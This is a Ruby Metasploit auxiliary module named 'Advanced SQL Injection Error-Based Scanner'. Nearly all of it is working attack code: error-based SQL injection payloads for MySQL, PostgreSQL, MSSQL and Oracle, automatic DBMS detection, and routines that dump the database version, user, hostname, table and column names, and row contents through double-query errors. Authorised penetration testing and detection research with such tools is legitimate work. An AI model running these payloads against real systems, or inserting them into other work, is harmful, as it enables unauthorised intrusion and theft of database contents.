##
# Module Name: Advanced SQL Injection Error-Based Scanner
# Author: [Your Name]
# License: Metasploit Framework License (BSD)
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Advanced SQL Injection Error-Based Scanner',
      'Description' => %q{
        Advanced error-based SQL injection detection with multi-DBMS support,
        comprehensive error extraction, and data exfiltration capabilities.
        Supports MySQL, PostgreSQL, MSSQL, Oracle, and SQLite.
      },
      'Author' => [ 'Your Name' ],
      'License' => MSF_LICENSE,
      'References' => [
        ['CWE', '89'],
        ['OWASP', 'A1'],
        ['URL', 'https://sqlwiki.netspi.com/']
      ]
    ))

    register_options([
      OptString.new('TARGETURI', [true, 'Target path', '/']),
      OptString.new('PARAMETERS', [true, 'Parameters to test', 'id']),
      OptString.new('METHOD', [true, 'HTTP Method', 'GET']),
      OptString.new('COOKIE', [false, 'Session cookie', '']),
      OptString.new('POST_DATA', [false, 'POST data', '']),
      OptEnum.new('DBMS', [true, 'Target DBMS', 'auto', ['auto', 'MySQL', 'PostgreSQL', 'MSSQL', 'Oracle', 'SQLite']]),
      OptBool.new('EXTRACT_INFO', [true, 'Extract DB information', true]),
      OptBool.new('EXTRACT_DATA', [false, 'Extract table data', false]),
      OptInt.new('MAX_ROWS', [true, 'Max rows to extract', 10]),
      OptBool.new('VERBOSE', [true, 'Enable verbose output', false]),
      OptBool.new('AGGRESSIVE', [false, 'Use aggressive payloads', false]),
      OptBool.new('CLEAN_OUTPUT', [true, 'Clean extracted data', true])
    ])
  end

  def run_host(ip)
    parameters = datastore['PARAMETERS'].split(',').map(&:strip)
    base_uri = normalize_uri(target_uri.path)
   
    print_status("🔍 Testing #{ip} for error-based SQL injection")
    print_status("🎯 Target: #{rhost}:#{rport}#{base_uri}")
   
    unless test_connection(ip, base_uri)
      print_error("❌ Connection failed")
      return
    end
   
    dbms = datastore['DBMS']
    if dbms == 'auto'
      dbms = detect_dbms(ip, parameters.first, base_uri)
      if dbms
        print_good("✅ Detected DBMS: #{dbms}")
      else
        print_warning("⚠️ DBMS detection failed, using MySQL as default")
        dbms = 'MySQL'
      end
    end

    parameters.each do |param|
      print_status("\n📊 Testing parameter: #{param}")
     
      vulnerable, evidence = test_error_based(ip, param, base_uri, dbms)
     
      if vulnerable
        print_good("✅ VULNERABLE: #{ip} - Parameter '#{param}'")
        print_good("💥 #{evidence}") if evidence
       
        report_vulnerability(ip, param, evidence, dbms)
       
        if datastore['EXTRACT_INFO']
          extract_comprehensive_info(ip, param, base_uri, dbms)
        end
       
        if datastore['EXTRACT_DATA']
          extract_table_data(ip, param, base_uri, dbms)
        end
      else
        print_error("❌ NOT VULNERABLE: #{ip} - Parameter '#{param}'")
      end
    end
  end

  def test_connection(ip, uri)
    begin
      res = send_request_cgi({
        'uri' => uri,
        'method' => 'GET',
        'headers' => get_headers
      }, 10)
      
      if res && res.code == 200
        print_good("🔗 Connection successful")
        return true
      else
        print_error("💤 No response or invalid status: #{res.code if res}")
        return false
      end
    rescue => e
      print_error("💥 Connection test failed: #{e.message}")
      return false
    end
  end

  def detect_dbms(ip, parameter, uri)
    print_status("🕵️ Attempting DBMS detection...")
    
    detection_payloads = [
      # MySQL detection
      { payload: "1' AND (SELECT 1 FROM (SELECT count(*),concat(0x7e7e,version(),0x7e7e,floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ", dbms: 'MySQL', pattern: /Duplicate entry '~~([^']+)~~/ },
      
      # PostgreSQL detection  
      { payload: "1' AND CAST(version() AS INTEGER)-- ", dbms: 'PostgreSQL', pattern: /invalid input syntax|postgresql/i },
      
      # MSSQL detection
      { payload: "1' AND CONVERT(int,@@version)-- ", dbms: 'MSSQL', pattern: /conversion failed|microsoft sql server/i },
      
      # Oracle detection
      { payload: "1' AND (SELECT 1 FROM (SELECT CTXSYS.DRITHSX.SN(version))a FROM DUAL)-- ", dbms: 'Oracle', pattern: /ora-\d+/i }
    ]
    
    detection_payloads.each do |test|
      res = send_request_with_param(parameter, test[:payload], uri)
      if res && res.body =~ test[:pattern]
        return test[:dbms]
      end
      sleep(0.2)
    end
    
    nil
  end

  def test_error_based(ip, parameter, uri, dbms)
    payloads = generate_error_payloads(dbms)
    
    payloads.each do |test|
      print_status("Testing: #{test[:description]}") if datastore['VERBOSE']
      
      vulnerable, evidence = test_payload_with_evidence(parameter, uri, test[:payload], test[:type])
      
      return true, evidence if vulnerable
      sleep(0.3)
    end
    
    [false, nil]
  end

  def generate_error_payloads(dbms)
    case dbms
    when 'MySQL'
      base_payloads = [
        # Basic syntax errors
        { payload: "1'", description: 'Single quote syntax', type: 'syntax' },
        { payload: "1\"", description: 'Double quote syntax', type: 'syntax' },
        
        # Double query errors
        { payload: "1' AND (SELECT 1 FROM (SELECT count(*),concat(0x7e7e,version(),0x7e7e,floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ", 
          description: 'Double query version', type: 'double_query' },
        
        # XPATH errors
        { payload: "1' AND extractvalue(1,concat(0x7e7e,version(),0x7e7e))-- ", 
          description: 'ExtractValue version', type: 'xpath' },
        { payload: "1' AND updatexml(1,concat(0x7e7e,version(),0x7e7e),1)-- ", 
          description: 'UpdateXML version', type: 'xpath' },
          
        # Geometry errors  
        { payload: "1' AND ST_LatFromGeoHash(version())-- ", 
          description: 'Geometry function', type: 'geometry' }
      ]
      
      # Add aggressive payloads if enabled
      if datastore['AGGRESSIVE']
        base_payloads += [
          { payload: "1' AND (SELECT 1 FROM (SELECT count(*),concat(0x7e7e,(SELECT CONCAT_WS(0x3a,@@version,@@hostname,user(),database())),0x7e7e,floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
            description: 'Aggressive double query', type: 'double_query' }
        ]
      end
      
      base_payloads
      
    when 'PostgreSQL'
      [
        { payload: "1' AND CAST(version() AS INTEGER)-- ", description: 'Cast to integer', type: 'cast' },
        { payload: "1' AND (SELECT 1 FROM (SELECT CAST(version() AS NUMERIC))a)-- ", description: 'Numeric cast', type: 'cast' }
      ]
      
    when 'MSSQL'
      [
        { payload: "1' AND CONVERT(int,@@version)-- ", description: 'Convert to int', type: 'convert' },
        { payload: "1' AND (SELECT 1 FROM (SELECT CONVERT(int,@@version))a)-- ", description: 'Subquery convert', type: 'convert' }
      ]
      
    when 'Oracle'
      [
        { payload: "1' AND (SELECT 1 FROM (SELECT CTXSYS.DRITHSX.SN(version))a FROM DUAL)-- ", description: 'CTXSYS error', type: 'ctxsys' }
      ]
      
    else
      [
        { payload: "1'", description: 'Single quote syntax', type: 'syntax' }
      ]
    end
  end

  def test_payload_with_evidence(parameter, uri, payload, type)
    res = send_request_with_param(parameter, payload, uri)
    return [false, nil] unless res
    
    error_detected, evidence = detect_and_extract_error(res.body, type)
    
    [error_detected, evidence]
  rescue => e
    print_error("Error testing payload: #{e.message}") if datastore['VERBOSE']
    [false, nil]
  end

  def detect_and_extract_error(body, type)
    body_lower = body.downcase
    
    case type
    when 'double_query'
      if body =~ /Duplicate entry '~~([^']+)~~/
        extracted = clean_extracted_data($1)
        return [true, "Double Query: #{extracted}"]
      end
      
    when 'xpath'
      if body =~ /XPATH syntax error: '~~([^']+)~~/
        extracted = clean_extracted_data($1)
        return [true, "XPATH: #{extracted}"]
      end
      
    when 'syntax'
      if body_lower =~ /sql syntax|you have an error in your sql/
        return [true, "SQL Syntax Error"]
      end
      
    when 'cast', 'convert'
      if body_lower =~ /invalid input syntax|conversion failed/
        return [true, "Type Conversion Error"]
      end
        
    when 'geometry'
      if body_lower =~ /incorrect.*value|geometry.*error/
        return [true, "Geometry Function Error"]
      end
    end
    
    # Generic error detection
    if body_lower =~ /mysql.*error|mysqli.*error|postgresql.*error|microsoft.*sql server|ora-\d+/
      return [true, "Generic Database Error"]
    end
    
    [false, nil]
  end

  def clean_extracted_data(data)
    return data unless datastore['CLEAN_OUTPUT']
    
    # Remove common artifacts from extraction
    cleaned = data.gsub(/~~$/, '')           # Remove trailing ~~
                 .gsub(/^~~/, '')           # Remove leading ~~
                 .gsub(/~1$/, '')           # Remove ~1 suffix from double query
                 .gsub(/^\d+~/, '')         # Remove number~ prefix
                 .strip
    
    cleaned.empty? ? data : cleaned
  end

  def extract_comprehensive_info(ip, parameter, uri, dbms)
    print_status("📈 Extracting comprehensive database information...")
    
    case dbms
    when 'MySQL'
      info_queries = [
        ["version()", "Version"],
        ["database()", "Database"], 
        ["user()", "User"],
        ["@@version_compile_os", "OS"],
        ["@@hostname", "Hostname"]
      ]
      
      info_queries.each do |query, name|
        data = extract_with_double_query(parameter, uri, "SELECT #{query}")
        if data
          cleaned_data = clean_extracted_data(data)
          print_good("✅ #{name}: #{cleaned_data}")
        end
        sleep(0.3)
      end
      
      extract_table_names(ip, parameter, uri, dbms)
      
    when 'PostgreSQL'
      # PostgreSQL extraction logic
      extract_with_postgresql(parameter, uri)
      
    when 'MSSQL'
      # MSSQL extraction logic  
      extract_with_mssql(parameter, uri)
    end
  end

  def extract_table_names(ip, parameter, uri, dbms)
    print_status("🗃️ Extracting table names...")
    
    case dbms
    when 'MySQL'
      data = extract_with_double_query(parameter, uri, 
        "SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()")
      
      if data
        tables = clean_extracted_data(data).split(',')
        print_good("📊 Tables: #{tables.join(', ')}")
        return tables
      end
    end
    
    []
  end

  def extract_table_data(ip, parameter, uri, dbms)
    tables = extract_table_names(ip, parameter, uri, dbms)
    
    tables.each do |table|
      print_status("📦 Extracting data from table: #{table}")
      
      # Extract column names
      columns = extract_columns(ip, parameter, uri, dbms, table)
      
      if columns.any?
        print_good("📋 Columns: #{columns.join(', ')}")
        extract_table_content(ip, parameter, uri, dbms, table, columns)
      end
    end
  end

  def extract_columns(ip, parameter, uri, dbms, table)
    case dbms
    when 'MySQL'
      data = extract_with_double_query(parameter, uri,
        "SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='#{table}'")
      
      data ? clean_extracted_data(data).split(',') : []
    else
      []
    end
  end

  def extract_table_content(ip, parameter, uri, dbms, table, columns)
    max_rows = datastore['MAX_ROWS']
    
    (1..max_rows).each do |row_num|
      row_data = []
      
      columns.each do |column|
        data = extract_with_double_query(parameter, uri,
          "SELECT #{column} FROM #{table} LIMIT #{row_num-1},1")
        
        if data
          cleaned_data = clean_extracted_data(data)
          row_data << "#{column}=#{cleaned_data}"
        end
        
        sleep(0.2)
      end
      
      if row_data.any?
        print_good("📝 Row #{row_num}: #{row_data.join(' | ')}")
      else
        break # No more data
      end
    end
  end

  def extract_with_double_query(param, uri, query)
    payload = "1' AND (SELECT 1 FROM (SELECT count(*),concat(0x7e7e,(#{query}),0x7e7e,floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- "
    res = send_request_with_param(param, payload, uri)
    
    if res && res.body =~ /Duplicate entry '~~([^']+)~~/
      return $1
    end
    
    nil
  end

  def send_request_with_param(parameter, value, uri, method = nil)
    method ||= datastore['METHOD'].upcase
    headers = get_headers
    vars = { parameter => value }
    
    # Add Submit parameter for DVWA-like applications
    vars['Submit'] = 'Submit' if uri.include?('sqli') && !vars.key?('Submit')

    begin
      if method == 'POST'
        # Merge with POST_DATA if provided
        post_vars = parse_post_data.merge(vars)
        send_request_cgi({
          'uri' => uri,
          'method' => 'POST',
          'vars_post' => post_vars,
          'headers' => headers
        })
      else
        send_request_cgi({
          'uri' => uri,
          'method' => 'GET',
          'vars_get' => vars,
          'headers' => headers
        })
      end
    rescue => e
      print_error("Request failed: #{e.message}") if datastore['VERBOSE']
      nil
    end
  end

  def parse_post_data
    params = {}
    if datastore['POST_DATA'] && !datastore['POST_DATA'].empty?
      datastore['POST_DATA'].split('&').each do |param|
        key, value = param.split('=', 2)
        params[key] = value if key
      end
    end
    params
  end

  def get_headers
    headers = {}
    headers['Cookie'] = datastore['COOKIE'] if datastore['COOKIE'] && !datastore['COOKIE'].empty?
    headers
  end

  def report_vulnerability(ip, parameter, evidence, dbms)
    report_vuln(
      host: ip,
      port: rport,
      proto: 'tcp',
      sname: (ssl ? 'https' : 'http'),
      name: 'SQL Injection Error-Based',
      info: "Parameter '#{parameter}' vulnerable to error-based SQL injection (#{dbms}) - #{evidence}",
      refs: references
    )
  end
end
      
